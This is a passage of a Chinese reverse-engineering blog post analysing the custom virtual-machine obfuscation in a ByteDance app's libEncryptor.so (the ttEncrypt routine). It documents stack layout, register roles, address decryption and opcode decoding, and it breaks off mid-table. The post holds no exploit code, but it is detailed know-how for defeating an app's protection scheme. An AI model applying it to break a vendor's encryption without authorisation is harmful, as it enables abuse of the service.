PRO虽然自带了安卓调试器总是没有相像中的稳定。lldb作为移动端iOS和android开发的御用调试器，带源码调试在开发环境中还算比较友好，而汇编级调试只能输入命令行了，这是很多用惯了gui调试器的人接受不了的，但是个人发现lldb调试稳定性出奇的好，功能上比IDA Pro的安卓调试器强大太多了。</p><h2>工具 &amp;&amp; 参考文档</h2><ul><li style="margin-left: 2px;"><p>静态分析工具IDA Pro<br />IDA Pro中的变量和标签命名约定: 1. 无下线为精确的名字，已经非常了解代码的功能和含义，例如："xxx"。2. "_"单下划线定义为代码的功能和含义比较模糊，例如："_xxx"。3. 双下划线为分析的代码模糊不清，由于地址不好记忆但需要命名以区分，例如："__xxx"。</p></li><li style="margin-left: 2px;"><p>动态分析工具<br />lldb</p></li><li style="margin-left: 2px;"><p>ARM参考文档《Arm Architecture Reference Manual》<br />《ARM Cortex-A Series Programmer's Guide for ARMv8-A》</p></li><li style="margin-left: 2px;"><p>其他工具<br />CyberChef</p></li></ul><p>libEncryptor.so一共包含了三套虚拟机，三套虚拟机各自独立并且代码一模一样，本文重点只分析<span style="font-weight: 700;">vm2虚拟机</span>。<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=647f0637&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B33ibiavOacibrYB6BY1kL8yEkiaG3KtOyATBJJCDicxADzZiagibT4ibic3qe43A%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="755" /></p><p><br /><span>虚拟机</span><span>指令编解码</span><span>参考借鉴了arm64的一部分规则，并实现了自己的一套规则，在后面的解码分析中会有很多和arm64解码相似的地方。</span><br /><span>另外虚拟机并没有像VMProtect那样将一条指令分割成多条"微指令"的方式，此虚拟机没有把当前真实的上下文放到虚拟机上下文去模拟执行，而是运行了一套自己单独的上下文。</span></p><p><br /></p><ol><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">vm1</code>: 0xDA0<br />在JNI_OnLoad中被调用，该虚拟机起始位置在0xDA0，主要作用解密是注册java native所需要的字符串和调用RegisterNatives进行注册。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">vm2</code>: 0x2AC4<br />虚拟机起始位置在0x2AC4，是java注册的原生接口com.bytedance.frameworks.encryptor.EncryptorUtil.ttEncrypt(byte[] buff, int size)，用来加密buff字节数组。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">vm3</code>: 0x444<br />代码位置在0x444，用于生成aes-128 cbc算法的key和iv。</p></li></ol><p>在函数中调用虚拟机时会传入一个指针数组类型参数变量，这是传入到虚拟机入口的唯一参数。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">vm_entry</span>(*<span style="color: rgb(255, 255, 182);">int</span> args)</code></pre><p>c伪代码来表示函数调用虚拟机入口</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">ttEncrypt</span>(<span style="color: rgb(255, 255, 182);">char</span>* buff, <span style="color: rgb(255, 255, 182);">int</span> buff_size) {<br />    <span style="color: rgb(255, 255, 182);">int</span> dst_size = size ＋<span style="color: rgb(255, 115, 253);">0x76</span>;<br />    <span style="color: rgb(255, 255, 182);">char</span>* pDstBuff = malloc(size ＋<span style="color: rgb(255, 115, 253);">0x76</span>);    vm_entry(buff, size, pDstBuff, &amp;dst_size);<br />}</code></pre><p>反汇编版本：<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=fa716c2a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3IXDl1ZibwWCu0S89hzDQy8gxUWAq8SXhxH8cP8uibjzUGzjtIwcmfpjQ%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><h2>入口</h2><p>IDA Pro查看入口的cfg图，复杂程序看似很难其实一点都不简单，话说回来cfg看起来和ollvm的混淆平坦化非常相似，其实和ollvm混淆关系不大，只不过一部分的switch被拉平了，在了解调度逻辑后分析也不算复杂。在代码中依然能看到两个ollvm swtich var变量，其作用没有详细分析，但整个cfg图确定与ollvm关系不是很大，猜测开启ollvm后性能会大幅下降影响app启动速度了。<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=1d44efe6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3wq5kCicEbjAkbmzL5Zh5jbwm7vE1HsgibrHRH8E3hr4FkLAw0V6AwpEg%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><span>在进入虚拟机运行时前，在入口需要准备虚拟机所需的内存和参数。对虚拟机内存布局情况必须了解如指掌，这样在动态和静态分析时才不会迷失方向。</span></p><p><br /></p><ul><li style="margin-left: 2px;"><p>分配空间入口首先会分配堆栈空间，真实堆栈空间中包含了参数占用、虚拟机运行时的上下文(context)和虚拟机堆栈的所使用的空间，从上图代码中看出虚拟机堆栈起始位置位于sp+0x38，结束位置sp+0x4D8，大小4D8-0x38=4A0，虚拟机所有可用真实内存为0x4A0，其中上下文(context)使用0x150，剩余分配给虚拟机堆栈4A0-150=2C0。<br />vm_entry调用vm2_run时的堆栈内存布局情况:</p></li></ul><table width="1628"><thead style="background-color: rgb(217, 226, 223);"><tr style="border-top: 1px solid rgb(198, 203, 209);"><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">SP</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">类型</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">变量名</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">注释</th></tr></thead><tbody><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x0</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">未使用</td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x8</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">char *</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">pSrcBuffer</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x10</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">int</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">srcSize</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x18</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">char *</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">pDstBuffer</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x20</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">int *</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">pDstBufferSize</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x28</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">void *</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">pCall_register_trampoline</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x30</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">void *</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">pVMMemoryEnd</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">偏移0x510</td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x38</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><span style="font-weight: 700;">vmMemoryStart</span></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">虚拟机运行时专用内存起始位置</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">...</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x510</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><span style="font-weight: 700;">vmMemoryEnd</span></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">虚拟机运行时内存结束位置</td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x518</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x520</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x28</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x528</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x19</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x530</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x29</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">上一个栈桢地址</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">0x538</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x30</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr></tbody></table><ul><li style="margin-left: 2px;"><p>参数在进入虚拟机正式执行前，vm2_entry在进入虚拟机运行时前会对5个参数进行初始化。<br /><code style="font-family: SFMono-Regular, Consolas, ;">pOpcode</code>：opcode指针指向虚拟机要执行的代码<br /><code style="font-family: SFMono-Regular, Consolas, ;">pArgs</code>：传入虚拟机的参数<br /><code style="font-family: SFMono-Regular, Consolas, ;">pReserve</code>：未使用，用途暂时未知<br /><code style="font-family: SFMono-Regular, Consolas, ;">pExternalFunc</code>：调用虚拟机外的函数列表，此列表是加密的。<br /><code style="font-family: SFMono-Regular, Consolas, ;">pVmData</code>：一个结构体指针，结构体存储了两指针分别是函数跳板地址另一个是虚拟机内存结束地址，{0x0: pCallRegisterTrampoline, 0x8: pVMMemoryEnd}</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;">vm2_run(<span style="color: rgb(255, 255, 182);">void</span>* pOpcode,  <span style="color: rgb(255, 255, 182);">void</span>* pArgs,  <span style="color: rgb(255, 255, 182);">void</span>* pReserve,  <span style="color: rgb(255, 255, 182);">void</span>* pExternalFunc， <span style="color: rgb(255, 255, 182);">void</span>* pVmData);</code></pre></li><li style="margin-left: 2px;"><p>opcode<br />vm2的opcode起始地址在0xB090，共占用0x2D8字节，每个opcode占用四个字节。</p></li><li style="margin-left: 2px;"><p>跳板函数跳板函数是衔接适配虚拟机和外部函数以及参数的桥梁，它包含来自虚拟机传递的两个参数, 参数1：x0是调用跳转的一个外部函数地址，参数2：x1是外部函数需要使用的参数指针。<br /></p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=cf6a960f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3qfznU7iaBJUgd3repAYJvC50FnLPs80eqbSBjlmHUMFEgUTV0lv8n8w%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></li><li style="margin-left: 2px;"><p>外部函数外部地址函数目标地址是被简单加密过的，在虚拟机指令中使用加法解密这8个地址，例如：0xDDD2D0(加密地址数据) + FF225870(key) = 0x2B40(目标地址)。截图中IDA Pro以默认0基址的地址，在调试时看到的地址数据是被代码手动重定位后的数据。<br /></p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=74941a0d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3eaVZjfuibteM4j1dlgGPA6KkkqGibnkbr44a0Wq9ics0dGEZXRR9dqGoQ%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1067" /></li></ul><h2>初始化</h2><p>vm2_run仅仅只分配了保存被调用者寄存器的堆栈内存空间，并没有分配空闲的堆栈内存，在虚拟机真实开始之前会将传递进来的5个参数即0x-x4对虚拟机中的虚拟寄存器和真实专用寄存器进行初始化。<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=e09d4842&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B35zAicYnKGXSQgCtYicdUOicahx1c1iaibNaibPvfhxpQYjSz4KxrgEOFFnqw%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><span>vm_run还初始化了解码opcode的switch表，在初始化时发现一共初始化了6张switch表，当然在handler中还存在其他switch表，这么多表是如何来的？猜测编写时只有1-2张表，在编译器优化后表就被分割成多块了。</span><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=34e4d8a4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3IDA9HcMksBUbdp2A1TOPBooAcs2s3BTsaSgtdCYQtRWlj51UYfn6hA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /><span></span></p><p><br /></p><ul><li style="margin-left: 2px;"><table width="1599"><thead style="background-color: rgb(217, 226, 223);"><tr style="border-top: 1px solid rgb(198, 203, 209);"><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">虚拟寄存器初始化<br />vm2_run初始化时会将传递的5个参数赋值给虚拟寄存器，其中包括PC和SP的值。</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">虚拟寄存器</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">参数</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">注释</th></tr></thead><tbody><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x0</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x0始终为0，XZR寄存器?</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x4</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">arg2: pArgs</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x5</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">arg3: pReserve</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x6</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">arg4: pExternalFunc</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x7</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">arg4: pVmData-&gt;pCallRegisterTrampolineFunction</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x29(SP)</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">arg5: pVmData-&gt;pVmMemoryLimit - 0x150</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">SP的初始值</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x31(LR)</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">初始值为0，寄存器名不确定，vm退出时保存退出代码编号</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">PC</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">arg1: pOpcode</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr></tbody></table></li><li style="margin-left: 2px;"><table width="1599"><thead style="background-color: rgb(217, 226, 223);"><tr style="border-top: 1px solid rgb(198, 203, 209);"><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">真实专用寄存器虚拟机运行时使用了真实虚拟器，其中包括临时寄存器和专用寄存器，临时寄存器保存多种类型的值，而专用寄存器在虚拟机从开始到退出只保存一种指定类型数据或恒定不变。opcode位域伪代码：w12保存了4位32字节的opcode，在opcode首次解码时，位域中的变量会放到真实寄存器。位域伪代码示例：<br /><code style="font-family: Consolas, Monaco, ;">w12[26]</code>: 取第26位到放到入目标的26位<br /><code style="font-family: Consolas, Monaco, ;">w12[26-&gt;0]</code>: 取第26位并放入到目标的指定位<br /><code style="font-family: Consolas, Monaco, ;">w12[27-26-&gt;1-0]</code>: 取27位和26位放入到目标第1位和第0位<br />`</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">`: 按位或</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">真实寄存器</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">注释</th></tr></thead><tbody><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x0</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">temp/pcode</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x1</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">temp,保存[x19-0x20]的值某种流程控制</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x2</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">temp</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x3</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">temp</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x4</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">虚拟寄存x4，初始化时保存pBufferInfo(x1)，虚拟机中保存跳板函数地址</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x5</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">虚拟寄存x5，初始化时保存数值为0，虚拟机运行时跳板函数的参数指针</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x6</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">ollvm混淆switch_var，初始值:0x400000b，这个应该是llvm混淆的switch var</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w7</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">ollvm混淆switch_var，初始值:0x200fff，这个应该是llvm混淆的switch var</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w8</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w12[20-16]   operand1 Xt/Xm,det register index?</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w9</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w12[25-21]   operand2 Xn,src register index?</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w10</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w12[15-&gt;4] |  w12[14-&gt;3] | w12[13-&gt;2] | w12[12-&gt;1] | w12[31-&gt;0],5个位合并到低5位</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w11</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w12[30-&gt;4] | w12[29-&gt;3] | w12[28-&gt;2] | w12[27-26-&gt;0-1],组成的低5位</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><span style="font-weight: 700;">w12</span></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><span style="font-weight: 700;">32位的opcode</span></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w13</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w12[31]</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w14</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w12[30]</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w15</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w12[29]</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w16</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w12[28]</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w17</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w12[27]</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w18</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">w12[26]</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">x19</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">虚拟机下文<span style="font-weight: 